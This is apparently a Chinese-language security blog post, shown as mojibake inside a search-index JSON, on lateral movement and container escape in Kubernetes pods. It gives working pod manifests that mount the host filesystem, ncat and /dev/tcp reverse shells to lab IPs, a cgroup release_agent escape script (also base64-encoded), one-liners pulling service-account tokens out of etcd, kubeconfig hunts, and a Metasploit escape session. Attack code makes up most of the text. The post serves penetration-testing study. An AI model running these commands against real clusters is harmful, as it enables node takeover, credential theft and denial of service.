å®¹å™¨ï¼Œåœ¨å¯åŠ¨çš„æ—¶å€™åˆå§‹åŒ–å®¹å™¨ï¼Œè¦å¯¹å®¹å™¨çš„ç½‘ç»œè¿›è¡Œè®¾ç½®ï¼Œå°±éœ€è¦ç‰¹æƒï¼Œå¯¹æ“ä½œç³»ç»Ÿçš„è®¾å¤‡ï¼Œå‘½åç©ºé—´è¿›è¡Œä¿®æ”¹ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±éœ€è¦ç‰¹æƒå®¹å™¨ hostPIDï¼šå®¹å™¨å°†å…±äº«å…¶ä¸»æœºçš„è¿›ç¨‹å‘½åç©ºé—´ï¼Œå®¹å™¨å¯ä»¥ç›´æ¥æŸ¥çœ‹å’Œæ“ä½œä¸»æœºä¸Šçš„è¿›ç¨‹ã€‚å…·ä½“è€Œè¨€ï¼ŒhostPID çš„ä½¿ç”¨é€šå¸¸ç”¨äºä¸€äº›ç‰¹æ®Šçš„ç”¨ä¾‹ï¼Œä¾‹å¦‚è¿è¡Œå®¹å™¨å†…çš„è¿›ç¨‹èƒ½å¤ŸæŸ¥çœ‹ä¸»æœºä¸Šçš„å…¶ä»–è¿›ç¨‹ã€‚ HostPathï¼šæ˜¯Kubernetesçš„ä¸€ä¸ªæ ¸å¿ƒå¯¹è±¡ä¹‹ä¸€ï¼Œå®ƒå…è®¸åœ¨Podä¸­ä½¿ç”¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€‚HostPathæ”¯æŒè¯»å†™å’Œåªè¯»æ“ä½œï¼Œå¹¶æä¾›äº†ä¸°å¯Œçš„è®¿é—®æƒé™æ§åˆ¶é€‰é¡¹ã€‚ HostNetworkï¼šå…è®¸ Pod ç›´æ¥ä½¿ç”¨ä¸»æœºï¼ˆNodeï¼‰çš„ç½‘ç»œå‘½åç©ºé—´ã€‚å½“ Pod å¯ç”¨ HostNetwork æ—¶ï¼Œå®ƒä¸ä¸»æœºå…±äº«ç½‘ç»œæ ˆï¼Œå¯ä»¥è®¿é—®ä¸»æœºä¸Šçš„ç½‘ç»œæ¥å£å’Œç«¯å£ã€‚ HostIPC ï¼šæ˜¯ä¸€ç§ Pod å®‰å…¨ä¸Šä¸‹æ–‡ï¼ˆPod Security Contextï¼‰çš„è®¾ç½®ï¼Œç”¨äºæ§åˆ¶ Pod æ˜¯å¦èƒ½å¤Ÿå…±äº«å®¿ä¸»æœºçš„ IPCï¼ˆInter-Process Communicationï¼‰å‘½åç©ºé—´ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:3:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4 ä¸åŒæƒé™ä¸‹çš„åœºæ™¯è®¨è®º ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:0","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.1 æ‰€æœ‰æƒé™å‡å¼€æ”¾ åˆ›å»ºçš„ pod ä¼šå°†ä¸»æœºçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° pod ä¸Šã€‚å¦‚æœèƒ½ä½¿ç”¨ k8s ä¸­çš„ nodeName é€‰æ‹©å™¨å°† pod è°ƒåº¦åœ¨control pannelä¸Šï¼Œç„¶åï¼Œåœ¨ pod ä¸­ chroot åˆ°æŒ‚è½½ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•ã€‚æœ€ç»ˆï¼Œåœ¨è¿è¡Œ pod çš„èŠ‚ç‚¹ä¸Šè·å–äº† root æƒé™ã€‚ ä» ETCD æ•°æ®åº“ä¸­è¯»å–å¯†é’¥ä¿¡æ¯ - æ”»å‡»è€…é€šè¿‡åœ¨ selector ä¸­æŒ‡å®š nodeNameï¼Œå³å¯åœ¨æŒ‡å®šçš„ node èŠ‚ç‚¹ä¸Šåˆ›å»º podï¼Œå½“ ectd æ•°æ®åº“éƒ¨ç½²åœ¨è¯¥èŠ‚ç‚¹ä¸Šæ—¶ï¼Œä¾¿å¯ä»¥è¯»å– etcd æ•°æ®åº“ä¸­çš„å†…å®¹ï¼ŒåŒ…å«ç¾¤é›†çš„é…ç½®ä¿¡æ¯ã€å¯†é’¥ç­‰ã€‚ è·å–ç‰¹æƒæœåŠ¡å¸æˆ·ä»¤ç‰Œ - å³ä½¿åªèƒ½åœ¨é›†ç¾¤ä¸­çš„ workerèŠ‚ç‚¹ä¸Šè°ƒåº¦ podï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¯»å–workerèŠ‚ç‚¹ä¸Š pod ä¸­æŒ‚è½½çš„å¯†é’¥ä¿¡æ¯ã€‚åœ¨ç”Ÿäº§é›†ç¾¤ä¸­ï¼Œå³ä½¿æ˜¯åœ¨ worker èŠ‚ç‚¹ä¸Šï¼Œé€šå¸¸ä¹Ÿè‡³å°‘æœ‰ä¸€ä¸ª pod æœ‰ä¸€ä¸ªå·²æŒ‚è½½çš„ä»¤ç‰Œï¼Œè¯¥ä»¤ç‰Œç»‘å®šåˆ°ä¸€ä¸ªæœåŠ¡å¸æˆ·ï¼ˆservice accountï¼‰ï¼Œå¦‚æœè¯¥ä»¤ç‰Œæ‹¥æœ‰è¾ƒé«˜æƒé™ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±æœ‰æƒé™åœ¨æ‰€æœ‰å‘½åç©ºé—´ä¸­åˆ›å»º podã€‚ 4.1.1 è·å– shell é¦–å…ˆè¯´ä¸€ä¸‹ç¬”è€…çš„å®éªŒç¯å¢ƒï¼š root@k8s-master:~# kubectl get nodes NAME STATUS ROLES AGE VERSION k8s-master Ready control-plane 2d19h v1.28.2 k8s-node1 Ready \u003cnone\u003e 2d19h v1.28.4 k8s-node2 Ready \u003cnone\u003e 2d19h v1.28.2 æŸ¥çœ‹å½“å‰ token æ‰€æ‹¥æœ‰çš„æƒé™ï¼š kubectl auth can-i --list --token=xxx ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå®ç°ä¸Šè¿°æ–¹æ³•ï¼š apiVersion: v1 kind: Pod metadata: name: all-allowed-exec-pod labels: app: prod spec: hostNetwork: true hostPID: true hostIPC: true containers: - name: all-allowed-pod image: ubuntu securityContext: privileged: true volumeMounts: - mountPath: /host name: noderoot command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] # å¯ä»¥é€šè¿‡èŠ‚ç‚¹é€‰æ‹©å™¨è°ƒåº¦åˆ° k8s-master control pannel ä¸­ nodeName: k8s-master volumes: - name: noderoot hostPath: path: / åˆ›å»º podsï¼š kubectl apply -f allow_all.yaml kubectl exec -it all-allowed-exec-pod -- chroot /host bash å¦‚æœæˆ‘ä»¬æ‰€åœ¨çš„ pods æ²¡æœ‰ pods/exec æƒé™ï¼Œå¯ä»¥é‡‡å–åå¼¹ shell çš„æ–¹å¼è·å– shellã€‚ apiVersion: v1 kind: Pod metadata: name: all-allowed-revshell-pod labels: app: prod spec: hostNetwork: true hostPID: true hostIPC: true containers: - name: all-allowed-pod image: raesene/ncat command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"ncat 192.168.88.139 4444 -e /bin/bash;\" ] securityContext: privileged: true volumeMounts: - mountPath: /host name: noderoot nodeName: k8s-master volumes: - name: noderoot hostPath: path: / åå¼¹å¾—åˆ°çš„ shellï¼š 4.1.2 åæ¸—é€ 4.1.2.1 å¯»æ‰¾ token é€šè¿‡å¦‚ä¸Šæ–¹å¼è·å–åˆ° control-pannel èŠ‚ç‚¹åï¼Œå¯ä»¥ä»etcd ä¸­è¯»å–æ•°æ®ï¼Œä¸€ç§ä¼˜é›…çš„æ–¹å¼æ˜¯é€šè¿‡å®‰è£… ectd å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ï¼Œä¸‹é¢ä»‹ç»ä¸€ç§ç®€æ˜“æ–¹å¼ï¼š æŸ¥çœ‹ etcd æ•°æ®åº“æ–‡ä»¶è·¯å¾„ï¼š ps -ef | grep etcd | sed s/\\-\\-/\\\\n/g | grep data-dir æŸ¥çœ‹æ•°æ®åº“æ–‡ä»¶å†…å®¹ strings /var/lib/etcd/member/snap/db | less ä»æ•°æ®åº“ä¸­è·å– sa åç§°ï¼Œå¹¶æå– tokenï¼š etcd=`strings /var/lib/etcd/member/snap/db`; for x in `echo \"$etcd\" | grep eyJhbGciOiJ`; do name=`echo \"$etcd\" | grep $x -B40 | grep registry`; echo $name \\| $x; echo; done è·å–ä¸€äº›é»˜è®¤ tokenï¼š etcd=`strings /var/lib/etcd/member/snap/db`; for x in `echo \"$etcd\" | grep eyJhbGciOiJ`; do name=`echo \"$etcd\" | grep $x -B40 | grep registry`; echo $name \\| $x; echo; done | grep kube-system | grep default åœ¨ pods ä¸­ç›´æ¥æŸ¥çœ‹æŒ‚è½½çš„ token cat /var/run/secrets/kubernetes.io/serviceaccount/token âš ï¸åœ¨ kubernetes 1.24 å¼€å§‹ï¼Œåˆ›å»º serviceaccount ä¸ä¼šè‡ªåŠ¨ç”Ÿæˆ secretï¼Œåœ¨ pods ä¸­è·å–çš„ token å±äºé›†ç¾¤è‡ªåŠ¨ç”Ÿæˆï¼Œä¸”æœ‰ 1h çš„æœ‰æ•ˆæœŸã€‚ 4.1.2.2 å¯»æ‰¾ kubeconfigs kubeconfigæ˜¯é›†ç¾¤çš„é…ç½®æ–‡ä»¶ï¼Œæ¯ä¸ªé›†ç¾¤å†…çš„ç”¨æˆ·é€šè¿‡å„ç§é›†ç¾¤å†…ç½®æˆ–è€…è‡ªå®šä¹‰çš„è§’è‰²ç»‘å®šä¸€å®šçš„æƒé™ã€‚é€šè¿‡ kuberconfigæ–‡ä»¶ï¼Œå°†å¯ä»¥åœ¨ä»»æ„ä¸€å°æœåŠ¡å™¨ä¸Šè¿›è¡Œ kubernetes é›†ç¾¤çš„ç®¡ç†ï¼Œä»…ä»…éœ€è¦ä¸€ä¸ª kubernetes é›†ç¾¤çš„ kubectl å®¢æˆ·ç«¯å³å¯ã€‚ find / -name kubeconfig find / -name kubelet.conf ls /etc/kubernetes/admin.conf find / -name .kube grep -R \"current-context\" /home/ grep -R \"current-context\" /root/ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:1","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.2 å¼€æ”¾ Privileged \u0026 HostPid æƒé™ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸ä¸Šä¸€ä¸ªåœºæ™¯ä¸‹çš„ pod ç›¸æ¯”ï¼Œå”¯ä¸€çš„å˜åŒ–æ˜¯å¦‚ä½•è·å¾—ä¸»æœºçš„ root è®¿é—®æƒé™ã€‚æ”»å‡»è€…åœ¨æ— æ³•é€šè¿‡ chroot åˆ°å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ nsenter åœ¨è¿è¡Œ pod çš„èŠ‚ç‚¹ä¸Šè·å– shell æƒé™ã€‚ nsenter æ˜¯ä¸€ä¸ª Linux å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºè¿›å…¥å·²æœ‰çš„å‘½åç©ºé—´ï¼Œå¯ä»¥åœ¨æŒ‡å®šè¿›ç¨‹çš„å‘½ä»¤ç©ºé—´ä¸‹è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚å‘½åç©ºé—´æ˜¯ä¸€ç§éš”ç¦»æœºåˆ¶ï¼Œç”¨äºéš”ç¦»è¿›ç¨‹çš„èµ„æºï¼Œè€Œå®¹å™¨æ˜¯é€šè¿‡å‘½åç©ºé—´è¿›è¡Œèµ„æºéš”ç¦»çš„ã€‚é€šè¿‡ä½¿ç”¨ nsenter å‘½ä»¤ï¼Œå¯ä»¥è¿›å…¥å·²ç»å­˜åœ¨çš„å‘½åç©ºé—´ï¼Œå¹¶åœ¨è¯¥å‘½åç©ºé—´ä¸­æ‰§è¡Œå‘½ä»¤æˆ–æŸ¥çœ‹å…¶çŠ¶æ€ã€‚ ç‰¹æƒå®¹å™¨ï¼ˆprivileged: trueï¼‰åœ¨å®¹å™¨å±‚é¢ä¸Šå‡ ä¹æ‰“ç ´äº†å®¹å™¨æœ¬åº”æä¾›çš„æ‰€æœ‰éš”ç¦»ã€‚PID å‘½åç©ºé—´æ˜¯å°‘æ•°ä»ç„¶å­˜åœ¨çš„éš”ç¦»å¢™ä¹‹ä¸€ã€‚ç„¶è€Œï¼Œæ²¡æœ‰ hostPIDï¼Œnsenter ä»…èƒ½ç”¨äºè¿›å…¥å®¹å™¨å†…è¿è¡Œçš„è¿›ç¨‹çš„å‘½åç©ºé—´ã€‚ å½“åŒæ—¶è®¾ç½® hostPID: true å’Œ privileged: true æ—¶ï¼ŒPod å°†èƒ½å¤Ÿçœ‹åˆ°ä¸»æœºä¸Šçš„æ‰€æœ‰è¿›ç¨‹ï¼Œå¹¶ä¸”ä½ å¯ä»¥è¿›å…¥ä¸»æœºä¸Šçš„ init ç³»ç»Ÿï¼ˆPID 1ï¼‰ï¼Œå¹¶åœ¨èŠ‚ç‚¹ä¸Šæ‰§è¡Œä½ çš„ shellã€‚ 4.2.1 è·å– shell apiVersion: v1 kind: Pod metadata: name: priv-hostpid-exec-pod labels: app: prod spec: hostPID: true containers: - name: priv-hostpid-pod image: ubuntu tty: true securityContext: privileged: true command: [ \"nsenter\", \"--target\", \"1\", \"--mount\", \"--uts\", \"--ipc\", \"--net\", \"--pid\", \"--\", \"bash\" ] nodeName: k8s-master åˆ›å»ºå¥½ pods åç›´æ¥ kubectl exec -it priv-hostpid-exec-pod -- bash å³å¯è·å–å®¿ä¸»æœº root æƒé™ã€‚ åŒæ ·çš„ï¼Œå¦‚æœæˆ‘ä»¬æ‰€åœ¨çš„ pods æ²¡æœ‰ pods/exec æƒé™ï¼Œå¯ä»¥é‡‡å–åå¼¹ shell çš„æ–¹å¼è·å– shellã€‚ apiVersion: v1 kind: Pod metadata: name: priv-hostpid-revshell-pod labels: app: prod spec: hostPID: true containers: - name: priv-and-hostpid-pod image: raesene/ncat securityContext: privileged: true command: [ \"/bin/sh\", \"-c\" ] args: [ \"ncat 192.168.88.138 4444 -e '/usr/bin/nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash'\" ] nodeName: k8s-master 4.2.2 åæ¸—é€ å…³äºåæ¸—é€çš„éƒ¨åˆ†å¯ä»¥å‚è€ƒå‰é¢çš„åœºæ™¯ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:2","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.3 å¼€æ”¾ Privilege æƒé™ å½“ä»…æ‹¥æœ‰ Privilege æƒé™æ—¶ï¼Œæœ‰å¦‚ä¸‹ä¸¤ç§æ–¹å¼å¯ä»¥è·å–é›†ç¾¤æƒé™ï¼š æŒ‚è½½å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿï¼šåœ¨ç‰¹æƒæ¨¡å¼ä¸‹ï¼Œå®¿ä¸»æœºä¸Šçš„ /dev åœ¨ Pod å†…æ˜¯å¯è®¿é—®çš„ã€‚å¯ä»¥ä½¿ç”¨ mount å‘½ä»¤å°†åŒ…å«å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜æŒ‚è½½åˆ° Pod ä¸­ã€‚ä½†æ˜¯é’ˆå¯¹ä¸€äº›é«˜æƒé™è·¯å¾„ï¼Œå¹¶ä¸èƒ½åœ¨ç‰¹æƒ Pod å†…å¯è®¿é—®ã€‚ åˆ©ç”¨ cgroup æ¼æ´ï¼šé€šè¿‡ä¸€äº›åˆ©ç”¨è„šæœ¬ï¼Œå¦‚ undock.sh ç­‰è·å– rootæƒé™ã€‚ 4.3.1 è·å– shell apiVersion: v1 kind: Pod metadata: name: priv-exec-pod labels: app: prod spec: containers: - name: priv-pod image: ubuntu securityContext: privileged: true command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] nodeName: k8s-master åŒæ ·çš„ï¼Œå¦‚æœæˆ‘ä»¬æ‰€åœ¨çš„ pods æ²¡æœ‰ pods/exec æƒé™ï¼Œå¯ä»¥é‡‡å–åå¼¹ shell çš„æ–¹å¼è·å– shellã€‚ apiVersion: v1 kind: Pod metadata: name: priv-revshell-pod labels: app: prod spec: containers: - name: priv-pod image: raesene/ncat securityContext: privileged: true command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"ncat 192.168.88.138 4444 -e /bin/bash;\" ] nodeName: k8s-master 4.3.2 åæ¸—é€ æŸ¥çœ‹å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿï¼š kubectl exec -it priv-exec-pod -- fdisk -l å¯ä»¥çœ‹åˆ° sda3 æ˜¯å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿï¼Œç›´æ¥æŒ‚è½½å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿï¼š kubectl exec -it priv-exec-pod -- mkdir /host kubectl exec -it priv-exec-pod -- bash -c \"mount /dev/sda3 /host/\" ç„¶åå¯ä»¥åœ¨è¿™äº›æ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œå¦‚tokenç­‰ï¼š å…·ä½“æ–¹æ³•åŒå‰é¢åœºæ™¯ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚ é‚£ä¹ˆï¼Œå¦‚ä½•é€šè¿‡ cgroup å‘½ä»¤æ‰§è¡Œå‘¢ï¼Ÿ 4.3.2.1 undock.sh æ‰§è¡Œå‘½ä»¤ #!/bin/bash d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` mkdir -p $d/w;echo 1 \u003e$d/w/notify_on_release t=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` touch /o; echo $t/c \u003e$d/release_agent;echo \"#!/bin/sh $1 \u003e$t/o\" \u003e/c;chmod +x /c;sh -c \"echo 0 \u003e$d/w/cgroup.procs\";sleep 1;cat /o æˆ–è€…ï¼š echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d \u003e undock.sh æ‰§è¡Œï¼š sh undock.sh \"cat /etc/shadow\" 4.3.2.2 åå¼¹ shell #!/bin/bash overlay=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` mkdir /tmp/escape mount -t cgroup -o blkio cgroup /tmp/escape mkdir -p /tmp/escape/w echo 1 \u003e /tmp/escape/w/notify_on_release echo \"$overlay/shell.sh\" \u003e /tmp/escape/release_agent sleep 3 \u0026\u0026 echo 0 \u003e/tmp/escape/w/cgroup.procs \u0026 nc -l -p 4444 escape.sh åˆ›å»º shell.sh #!/bin/bash /bin/bash -c \"/bin/bash -i \u003e\u0026 /dev/tcp/POD_IP/4444 0\u003e\u00261\" è¿è¡Œï¼š chmod +x shell.sh escape.sh \u0026\u0026 ./escape.sh 4.3.2.3 metasploit pods ä¸­åå¼¹shellï¼š root@pod-priv:/# /bin/sh -i \u003e\u0026 /dev/tcp/192.168.33.114/4444 0\u003e\u00261 msf ä¸­è®¾ç½®ç›‘å¬å™¨ä¸é…ç½®ï¼š msf6 \u003e use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u003e set LHOST 192.168.33.114 LHOST =\u003e 192.168.33.114 msf6 exploit(multi/handler) \u003e set lport 4444 lport =\u003e 4444 msf6 exploit(multi/handler) \u003e run [*] Started reverse TCP handler on 192.168.33.114:4444 [*] Command shell session 1 opened (192.168.33.114:4444 -\u003e 192.168.33.133:64341) at 2023-11-21 16:36:29 +0800 Shell Banner: # ----- # background Background session 1? [y/N] y msf6 exploit(multi/handler) \u003e use exploit/linux/local/docker_privileged_container_escape [*] No payload configured, defaulting to linux/armle/meterpreter/reverse_tcp msf6 exploit(linux/local/docker_privileged_container_escape) \u003e set payload linux/x64/meterpreter/reverse_tcp payload =\u003e linux/x64/meterpreter/reverse_tcp msf6 exploit(linux/local/docker_privileged_container_escape) \u003e set session 1 session =\u003e 1 msf6 exploit(linux/local/docker_privileged_container_escape) \u003e run ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:3","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.4 å¼€æ”¾ HostPath æƒé™ åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œå³ä½¿æ²¡æœ‰è®¿é—®ä¸»æœºè¿›ç¨‹æˆ–ç½‘ç»œå‘½åç©ºé—´çš„æƒé™ï¼Œå¦‚æœé›†ç¾¤ç®¡ç†å‘˜æ²¡æœ‰é™åˆ¶ pod å¯ä»¥æŒ‚è½½çš„å†…å®¹ï¼Œå¯ä»¥å°†å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°æ”»å‡»è€…åˆ›å»ºçš„ pod ä¸­ï¼Œä»è€Œè·å¾—å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„è¯»/å†™æƒé™ã€‚ ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ææƒæ‰‹æ³•ï¼š å¯»æ‰¾ kubeconfig æ–‡ä»¶ - é€šè¿‡æŸ¥çœ‹å®¿ä¸»æœºä¸­çš„ kubeconfig æ–‡ä»¶ï¼Œæœ‰å¯èƒ½è·å–é›†ç¾¤ç®¡ç†å‘˜çš„ token æƒé™ã€‚ è·å–å®¿ä¸»æœºèŠ‚ç‚¹ä¸Š pod çš„ä»¤ç‰Œ - å¯ä»¥ä½¿ç”¨ kubectl auth can-i --list æŸ¥çœ‹å…¶å®ƒçš„ pod çš„ä»¤ç‰Œæ¯”å½“å‰æƒé™æ›´é«˜ã€‚ æ·»åŠ  SSH å¯†é’¥ - å°†æœ¬åœ°çš„å…¬é’¥æ·»åŠ åˆ°å®¿ä¸»æœºèŠ‚ç‚¹ï¼ŒSSH ç™»å½•ï¼Œè·å– shellã€‚ ç ´è§£ hash å¯†ç  - ç ´è§£ /etc/shadow ä¸­çš„ hash å¯†ç ã€‚ 4.4.1 è·å– shell åˆ›å»º pod æŒ‚è½½å®¿ä¸»æœºæ–‡ä»¶ç³»ç»Ÿï¼š apiVersion: v1 kind: Pod metadata: name: hostpath-exec-pod labels: app: prod spec: containers: - name: hostpath-exec-pod image: ubuntu volumeMounts: - mountPath: /host name: noderoot command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] nodeName: k8s-master volumes: - name: noderoot hostPath: path: / å¦‚æœæˆ‘ä»¬æ‰€åœ¨çš„ pods æ²¡æœ‰ pods/exec æƒé™ï¼Œå¯ä»¥é‡‡å–åå¼¹ shell çš„æ–¹å¼è·å– shellã€‚ apiVersion: v1 kind: Pod metadata: name: hostpath-revshell-pod labels: app: prod spec: containers: - name: hostpath-revshell-pod image: raesene/ncat volumeMounts: - mountPath: /host name: noderoot command: [ \"/bin/sh\", \"-c\", \"--\" ] args: [ \"ncat 192.168.88.138 4444 -e /bin/bash;\" ] nodeName: k8s-master volumes: - name: noderoot hostPath: path: / 4.4.2 åæ¸—é€ å…³äºåæ¸—é€çš„éƒ¨åˆ†å¯ä»¥å‚è€ƒå‰é¢çš„åœºæ™¯ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:4","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.5 å¼€æ”¾ HostPid æƒé™ åœ¨åªæœ‰ hostPID æƒé™çš„èŠ‚ç‚¹ä¸Šç›®å‰æ²¡æœ‰è¾ƒå¥½çš„ getshell çš„æ–¹æ³•ï¼Œä½†æ˜¯å¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªæ–¹é¢æ€è€ƒï¼š æŸ¥çœ‹å®¿ä¸»æœºä¸Šçš„è¿›ç¨‹ - åœ¨æ‹¥æœ‰ hostPID æƒé™çš„ pod ä¸­è¿è¡Œ ps æ—¶ï¼Œå¯ä»¥çœ‹åˆ°å®¿ä¸»æœºä¸Šè¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹ï¼ŒåŒ…æ‹¬æ¯ä¸ª pod ä¸­è¿è¡Œçš„è¿›ç¨‹ã€‚ æŸ¥æ‰¾å¯†ç ã€ä»¤ç‰Œã€å¯†é’¥ç­‰ - é€šè¿‡æœç´¢è¿›ç¨‹å‘½ä»¤è¡Œã€æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„å¯†é’¥æˆ–token è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚ æ‹’ç»æœåŠ¡æ”»å‡» - å¯ä»¥ kill å½“å‰èŠ‚ç‚¹ä¸Šçš„ä»»ä½•è¿›ç¨‹ï¼Œå®ç°æ‹’ç»æœåŠ¡çš„æ•ˆæœã€‚ ","date":"2023-11-29","objectID":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/:4:5","tags":["äº‘åŸç”Ÿå®‰å…¨","k8s"],"title":"Kubernetes Pod æ¨ªå‘ç§»åŠ¨","uri":"/2023/11/kubernetes-pod-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"4.6 å¼€æ”¾ HostNetwork æƒé™ å¦‚æœåªæœ‰ hostNetwork æƒé™ï¼Œæœ‰ä¸‰ç§å¯èƒ½çš„ææƒè·¯å¾„ï¼š è®¿é—®ç»‘å®šåˆ°å®¿ä¸»æœº localhost çš„æœåŠ¡ - å¯ä»¥è®¿é—®åªç›‘å¬ä¸»æœºç¯å›æ¥å£æˆ–è¢«ç½‘ç»œç­–ç•¥é˜»æ­¢çš„æœåŠ¡ã€‚æ¯”å¦‚ï¼šapi server çš„ 8080 ç«¯å£æä¾›çš„æ˜¯æ²¡æœ‰ TLS åŠ å¯†çš„ HTTP æœåŠ¡ï¼Œä¸”æ‰€æœ‰åˆ°è¾¾è¯¥ç«¯å£çš„è¯·æ±‚å°†ç»•è¿‡æ‰€æœ‰è®¤è¯å’Œæˆæƒæ¨¡å—ï¼Œå¦‚æœå¯ä»¥è®¿é—®è¯¥æ¥å£ï¼Œå°±å¯ä»¥æ¥ç®¡é›†ç¾¤ã€‚ å—…æ¢æµé‡ - å¯ä»¥ä½¿ç”¨ tcpdump åœ¨ä¸»æœºçš„ç½‘ç»œæ¥å£ä¸Šå—…æ¢æœªåŠ å¯†çš„æµé‡ã€‚é€šè¿‡æµé‡ç›‘æ§å¯ä»¥å‘ç°æœªåŠ å¯†é€šé“ä¼ è¾“çš„æœåŠ¡å¸æˆ·ä»¤ç‰Œæˆ–å…¶å®ƒæ•æ„Ÿä¿¡æ¯ã€‚ ç»•è¿‡ç½‘ç»œç­–ç•¥ - å¦‚æœå‘½åç©ºé—´åº”ç”¨äº†é™åˆ¶æ€§ç½‘ç»œç­–ç•¥ï¼Œé‚£ä¹ˆéƒ¨ç½²å¸¦æœ‰ hostNetwork æƒé™çš„ pod å°±å¯ä»¥ç»•è¿‡è¿™äº›é™åˆ¶ã€‚ 4.6.1 è·å– shell 